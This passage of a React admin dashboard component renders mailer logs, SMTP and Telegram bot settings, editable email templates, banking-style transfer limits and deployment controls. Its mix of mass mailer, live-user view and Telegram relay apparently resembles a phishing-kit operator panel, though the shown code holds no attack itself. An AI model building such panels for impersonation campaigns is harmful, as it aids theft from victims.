                  <Terminal className="w-4 h-4 text-red-500" />
                  MAILER LOGS
                </h3>
                <button 
                  onClick={handleClearMailerLogs}
                  className="p-1.5 bg-white/5 hover:bg-red-500/20 text-gray-400 hover:text-red-500 rounded transition-colors"
                  title="Clear Mailer Logs"
                >
                  <Trash2 className="w-3.5 h-3.5" />
                </button>
              </div>
              <div className="bg-black/40 rounded border border-white/5 p-2 font-mono text-[8px] h-[200px] overflow-y-auto">
                {mailerLogs.length === 0 ? (
                  <div className="text-gray-600 italic">No logs found.</div>
                ) : (
                  mailerLogs.map((log, i) => (
                    <div key={i} className="mb-1 border-b border-white/5 pb-1 last:border-0">
                      {log}
                    </div>
                  ))
                )}
              </div>
            </div>

            {mailerConfig && (
              <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
                <h3 className="text-xs font-bold mb-3 flex items-center gap-2">
                  <RefreshCw className="w-4 h-4 text-red-500" />
                  SMTP CONFIG
                </h3>
                <div className="space-y-2 text-[9px] font-mono">
                  <div className="flex justify-between border-b border-white/5 pb-1">
                    <span className="text-gray-500">HOST:</span>
                    <span>{mailerConfig.smtp?.host}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/5 pb-1">
                    <span className="text-gray-500">PORT:</span>
                    <span>{mailerConfig.smtp?.port}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/5 pb-1">
                    <span className="text-gray-500">USER:</span>
                    <span>{mailerConfig.smtp?.user}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/5 pb-1">
                    <span className="text-gray-500">SENDER:</span>
                    <span>{mailerConfig.general?.sender_name}</span>
                  </div>
                </div>
              </div>
            )}
          </div>
        ) : activeTab === 'templates' ? (
          <div className="space-y-3">
            {!selectedTemplate ? (
              templates.map((t: Template) => (
                <div key={t.name} className="p-3 bg-[#2c2c2e] rounded-lg border border-white/5 hover:border-white/20 cursor-pointer" onClick={() => fetchTemplateContent(t.name)}>
                  <div className="font-bold text-xs">{t.name}</div>
                  <div className="text-[9px] text-gray-400">Last modified: {t.last_modified}</div>
                </div>
              ))
            ) : (
              <div className="space-y-3">
                <button onClick={() => setSelectedTemplate(null)} className="text-[9px] text-gray-400 hover:text-white">← Back to templates</button>
                <div className="font-bold text-xs">{selectedTemplate}</div>
                <textarea 
                  value={templateContent} 
                  onChange={(e) => setTemplateContent(e.target.value)}
                  className="w-full h-[300px] bg-black/40 rounded border border-white/5 p-2 font-mono text-[9px]"
                />
                <button onClick={handleUpdateTemplate} className="bg-red-600 hover:bg-red-700 py-2 px-4 rounded text-[10px] font-bold transition-colors">Update Template</button>
              </div>
            )}
          </div>
        ) : activeTab === 'settings' ? (
          <div className="space-y-4">
            {globalSettings ? (
              <>
                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
                  <h3 className="text-xs font-bold mb-3 flex items-center gap-2 text-red-500">
                    <Send className="w-4 h-4" />
                    SMTP CONFIGURATION
                  </h3>
                  <div className="space-y-3">
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Host</label>
                      <input 
                        type="text" 
                        value={globalSettings.smtp.host} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, host: e.target.value } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <div className="space-y-1">
                        <label className="text-[9px] text-gray-500 uppercase font-bold">Port</label>
                        <input 
                          type="number" 
                          value={globalSettings.smtp.port} 
                          onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, port: parseInt(e.target.value) } })}
                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                        />
                      </div>
                      <div className="space-y-1">
                        <label className="text-[9px] text-gray-500 uppercase font-bold">Secure</label>
                        <select 
                          value={globalSettings.smtp.secure ? 'true' : 'false'} 
                          onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, secure: e.target.value === 'true' } })}
                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                        >
                          <option value="true">SSL/TLS</option>
                          <option value="false">STARTTLS</option>
                        </select>
                      </div>
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">User</label>
                      <input 
                        type="text" 
                        value={globalSettings.smtp.user} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, user: e.target.value } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Password</label>
                      <input 
                        type="password" 
                        value={globalSettings.smtp.pass} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, pass: e.target.value } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Sender Name</label>
                      <input 
                        type="text" 
                        value={globalSettings.smtp.senderName} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, senderName: e.target.value } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
                  <h3 className="text-xs font-bold mb-3 flex items-center gap-2 text-blue-500">
                    <MessageSquare className="w-4 h-4" />
                    TELEGRAM CONFIG
                  </h3>
                  <div className="space-y-3">
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Bot Token</label>
                      <input 
                        type="text" 
                        value={globalSettings.telegram.token} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, telegram: { ...globalSettings.telegram, token: e.target.value } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Chat ID</label>
                      <input 
                        type="text" 
                        value={globalSettings.telegram.chatId} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, telegram: { ...globalSettings.telegram, chatId: e.target.value } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
                  <h3 className="text-xs font-bold mb-3 flex items-center gap-2 text-emerald-500">
                    <Terminal className="w-4 h-4" />
                    GENERAL SETTINGS
                  </h3>
                  <div className="space-y-3">
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">App URL</label>
                      <input 
                        type="text" 
                        value={globalSettings.general.app_url || ''} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, app_url: e.target.value } })}
                        placeholder="https://app.com"
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Mailer URL (Webroot)</label>
                      <input 
                        type="text" 
                        value={globalSettings.general.webroot_url || ''} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, webroot_url: e.target.value } })}
                        placeholder="https://sim.com"
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Admin PIN</label>
                      <input 
                        type="text" 
                        value={globalSettings.general.adminPin} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, adminPin: e.target.value } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[9px] text-gray-500 uppercase font-bold">Overdraft Limit ($)</label>
                      <input 
                        type="number" 
                        value={globalSettings.general.overdraftLimit} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, overdraftLimit: parseInt(e.target.value) } })}
                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                      />
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <div className="space-y-1">
                        <label className="text-[9px] text-gray-500 uppercase font-bold">Transfer Limit ($)</label>
                        <input 
                          type="number" 
                          value={globalSettings.general.transferLimit} 
                          onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, transferLimit: parseInt(e.target.value) } })}
                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                        />
                      </div>
                      <div className="space-y-1">
                        <label className="text-[9px] text-gray-500 uppercase font-bold">Daily Limit ($)</label>
                        <input 
                          type="number" 
                          value={globalSettings.general.dailyLimit} 
                          onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, dailyLimit: parseInt(e.target.value) } })}
                          className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
                        />
                      </div>
                    </div>
                    <div className="flex items-center gap-2 pt-2">
                      <input 
                        type="checkbox" 
                        id="maintenanceMode"
                        checked={globalSettings.general.maintenanceMode} 
                        onChange={(e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, maintenanceMode: e.target.checked } })}
                        className="w-4 h-4 rounded bg-black/30 border-white/10 text-red-500 focus:ring-red-500/50"
                      />
                      <label htmlFor="maintenanceMode" className="text-[10px] text-gray-300 font-bold uppercase">Maintenance Mode</label>
                    </div>
                  </div>
                </div>

                <button 
                  onClick={saveGlobalSettings}
                  className="w-full bg-red-600 hover:bg-red-700 py-3 rounded-lg text-xs font-bold transition-colors shadow-lg"
                >
                  SAVE ALL SETTINGS
                </button>
              </>
            ) : (
              <div className="text-center py-10 text-gray-500 italic">Loading settings...</div>
            )}
          </div>
        ) : activeTab === 'system' ? (
          <div className="space-y-4">
            <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5">
              <h3 className="text-xs font-bold mb-3 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-red-500" />
                DEPLOYMENT CONTROL
              </h3>
              <div className="grid grid-cols-1 gap-2">
                <button 
                  onClick={() => handleCommand('all', 'deploy', { args: [] })}
                  className="bg-red-600 hover:bg-red-700 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
                >
                  <RefreshCw className="w-4 h-4" /> RUN DEPLOYMENT SCRIPT
                </button>
                <button 
                  onClick={() => handleCommand('all', 'deploy', { args: ['rebuild'] })}
                  className="bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
                >
                  <RefreshCw className="w-4 h-4" /> REBUILD CONTAINERS
                </button>
                <div className="grid grid-cols-2 gap-2">
                  <button 
                    onClick={() => handleCommand('all', 'deploy', { args: ['restart'] })}
                    className="bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
                  >
                    RESTART
                  </button>
                  <button 
                    onClick={() => handleCommand('all', 'deploy', { args: ['stop'] })}
                    className="bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2"
                  >
                    STOP
                  </button>
                </div>
              </div>
            </div>

            <div className="p-4 bg-black rounded-lg border border-white/10 font-mono text-[9px] h-[300px] overflow-y-auto flex flex-col-reverse">
              <div className="space-y-1">
                {deployOutput.length === 0 ? (
                  <div className="text-gray-600"># Waiting for deployment output...</div>
                ) : (
                  deployOutput.map((line, i) => (
                    <div key={i} className="text-green-400 whitespace-pre-wrap">
                      <span className="text-gray-500 mr-2">$</span>
                      {line}
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        ) : (
          <div className="text-center py-10 text-gray-500 italic">Select a tab to begin.</div>
        )}
      </div>

      {/* TACTICAL COMMAND FOOTER */}
      <div className="fixed bottom-0 left-0 right-0 bg-[#111113]/90 backdrop-blur-2xl border-t border-white/5 px-4 py-3 flex items-center justify-around z-[1100]">
        <button 
          onClick={() => setActiveTab('live')}
          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'live' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
        >
          <Zap className={`w-5 h-5 ${activeTab === 'live' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
          <span className="text-[8px] font-black uppercase tracking-widest">Live</span>
        </button>
        <button 
          onClick={() => { setActiveTab('database'); fetchUsers(); }}
          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'database' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
        >
          <Database className={`w-5 h-5 ${activeTab === 'database' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
          <span className="text-[8px] font-black uppercase tracking-widest">Base</span>
        </button>
        <button 
          onClick={() => { setActiveTab('mailer'); fetchMailerData(); fetchTemplates(); }}
          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'mailer' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
        >
          <Mail className={`w-5 h-5 ${activeTab === 'mailer' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
          <span className="text-[8px] font-black uppercase tracking-widest">Comms</span>
        </button>
        <button 
          onClick={() => setActiveTab('system')}
          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'system' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
        >
          <Terminal className={`w-5 h-5 ${activeTab === 'system' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
          <span className="text-[8px] font-black uppercase tracking-widest">Ops</span>
        </button>
        <button 
          onClick={() => { setActiveTab('settings'); fetchGlobalSettings(); }}
          className={`flex flex-col items-center gap-1 transition-all ${activeTab === 'settings' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`}
        >
          <Settings className={`w-5 h-5 ${activeTab === 'settings' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}`} />
          <span className="text-[8px] font-black uppercase tracking-widest">Core</span>
        </button>
      </div>
    </div>
  );
};
